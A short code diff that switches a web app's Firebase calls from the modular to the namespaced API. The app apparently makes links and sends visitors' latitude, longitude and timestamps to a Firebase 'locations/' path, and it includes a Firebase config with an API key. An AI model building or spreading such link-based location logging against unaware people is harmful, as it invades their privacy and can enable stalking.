@@ -1,6 +1,3 @@
-import { initializeApp } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-app.js";
-import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.5.0/firebase-database.js";
-
 const firebaseConfig = {
     apiKey: "AIzaSyBb_fTtLdRVHXmK8SDqrb2Cmfz66JdTxxI",
     authDomain: "projeto-68121.firebaseapp.com",
@@ -11,8 +8,8 @@ const firebaseConfig = {
     measurementId: "G-1G1F8RQRN6"
 };
 
-const app = initializeApp(firebaseConfig);
-const database = getDatabase(app);
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
 
 const urlInput = document.getElementById('urlInput');
 const createLinkButton = document.getElementById('createLinkButton');
@@ -39,7 +36,7 @@ function getLocation() {
 }
 
 function sendLocationToFirebase(latitude, longitude) {
-    push(ref(database, 'locations/'), {
+    database.ref('locations/').push({
         latitude: latitude,
         longitude: longitude,
         timestamp: Date.now()
